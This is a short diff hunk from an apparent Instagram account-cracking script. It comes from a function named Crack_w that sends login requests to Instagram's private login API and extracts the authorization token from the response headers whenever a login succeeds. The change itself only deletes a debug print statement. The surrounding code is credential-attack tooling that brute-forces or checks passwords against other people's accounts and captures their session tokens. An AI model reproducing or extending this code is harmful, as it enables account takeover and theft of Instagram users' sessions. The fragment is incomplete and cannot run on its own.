@@ -1089,7 +1089,6 @@ def Crack_w(username, memek):
             bk_client_context_str = json.dumps(bk_client_context, separators=(',', ':'))
             data = {"params": params_str,"bk_client_context": bk_client_context_str,"bloks_versioning_id": "521ea70a72c103e016c2ffa10d09834a109b7f5af5ec7a7c9a0e20e3b5bc71d9"}
             response = ses.post('https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/',data=data,allow_redirects=True)
-            print(response.text)
             if "logged_in_user" in str(response.text.replace('\\', '')):
                 header_str = str(response.headers)
                 ig_set_search = re.search(r'IG-Set-Authorization["\']?\s*:\s*["\']?([^"\',]+)', header_str, re.IGNORECASE)
